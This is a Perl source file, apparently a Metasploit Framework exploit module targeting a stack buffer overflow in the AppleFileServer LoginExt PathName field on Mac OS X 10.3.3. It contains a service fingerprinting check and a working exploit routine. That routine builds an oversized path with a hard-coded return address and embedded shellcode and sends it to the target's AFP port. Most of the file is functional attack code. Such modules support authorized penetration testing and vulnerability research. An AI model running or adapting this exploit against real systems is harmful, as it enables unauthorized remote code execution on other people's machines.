##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::afp_loginext;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'AppleFileServer LoginExt PathName Buffer Overflow',
    'Version'  => '$Revision: 1.17 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'  => [ 'ppc' ],
    'OS'    => [ 'osx' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The AFP port', 548],
                   },
                
    'Payload' => {
                    'Space'     => 512,
                    'BadChars'  => "\x00\x20",
                    'MinNops'   => 128,
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
     This module exploits a stack overflow in the AppleFileServer service
     on MacOS X. This vulnerability was originally reported by Atstake and
     was actually one of the few useful advisories ever published by that
     company. You only have one chance to exploit this bug.
    }),
    'Refs'  =>  [  
                    'http://www.osvdb.org/5762',
                ],
    'Targets' => [ 
                    ["Mac OS X 10.3.3",   0xf0101c0c],
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');

    my $dsi = 
    "\x00".                   # Flags
    "\x03".                   # Command
    pack('n', rand()*65535).  # Request ID
    pack('N', 0).             # Data Offset
    pack('N', 0).             # Length
    pack('N', 0);             # Reserved
    
    
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return $self->CheckCode('Connect');
    }
    
    $s->Send($dsi);
    my $res = $s->Recv(16, 5);
    
    if (! $res || length($res) != 16) {
        $self->PrintLine("[*] Invalid response from target");
        return $self->CheckCode('Generic');
    }
    
    my @afphdr = unpack('ccnNNN', $res);
    if ($afphdr[0] != 1 || $afphdr[1] != 3 || $afphdr[4] == 0) {
        $self->PrintLine("[*] Strange response from target");
        return $self->CheckCode('Generic');
    }

    # read in the rest of the packet based on length
    $res = $s->Recv($afphdr[4], 5);

    if (length($res) != $afphdr[4]) {
        $self->PrintLine("[*] Failed to receive all of the AFP response");
        return $self->CheckCode('Generic');                
    }

    my (@stathdr) = unpack('nnnnn', $res);

    my $machine = $self->ReadAFPString(substr($res, $stathdr[0]));
    my @version = $self->ReadAFPList(substr($res, $stathdr[1]));
    my @uams    = $self->ReadAFPList(substr($res, $stathdr[2]));
    my $icon    = $self->ReadAFPString(substr($res, $stathdr[3]));
    my $name    = $self->ReadAFPString(substr($res, 10)); 
    
    $self->PrintDebugLine(1, "INFO: machine: $machine");
    $self->PrintDebugLine(1, "INFO:    name: $name");
    $self->PrintDebugLine(1, "INFO:    flag: ".$stathdr[4]);

    foreach (@version) {
       $self->PrintDebugLine(1, "INFO: version: $_");
    }
    foreach (@uams) {
       $self->PrintDebugLine(1, "INFO:     uam: $_");
    }
    
    if ( $machine eq 'Macintosh'    &&
         grep(/AFP3\.1/,  @version) &&
         grep(/Cleartxt/, @uams) )
    {
        $self->PrintLine("[*] Possibly vulnerable MacOS X system found");
        return $self->CheckCode('Detected');        
    }
    
    $self->PrintLine("[*] This system does not appear to be vulnerable");
    return $self->CheckCode('Safe');
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];
    my $path = "\xff" x 1024;

    substr($path, 168,  4, pack('N', $target->[1]));
    substr($path, 172, length($shellcode), $shellcode);

    my $afp = "\x3F\x00\x00\x00".
              pack('C',length("AFP3.1"))."AFP3.1".
              pack('C',length("Cleartxt Passwrd"))."Cleartxt Passwrd".
              "\x03".   # user type
              pack('n',length("metasploit"))."metasploit".
              "\x03".   # afp path type
              pack('n',32).$path;
            
    my $req =
        pack('CCnNNN',
                0,                  # Flags
                2,                  # Command
                rand() * 0xffff,    # Request ID
                0,                  # Data Offset
                length($afp),       # Data Length
                0,                  # Reserved
            ).
            $afp;

    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }
    
    $self->PrintLine("[*] Sending request to AppleFileServer (".length($req).") bytes");
    $s->Send($req);

    return;
}

sub ReadAFPString {
    my $self = shift;
    my $data = shift;
    return substr($data, 1, unpack('c', $data));
}

sub ReadAFPList {
    my $self = shift;
    my $data = shift;
    my @res;
    
    my $list = unpack('c', $data);
    $data = substr($data, 1);
    
    for (my $idx = 0; $idx < $list; $idx++) {
        my $item = $self->ReadAFPString($data);
        $data = substr($data, length($item)+1);
        push @res, $item;
    }
    return @res;
}
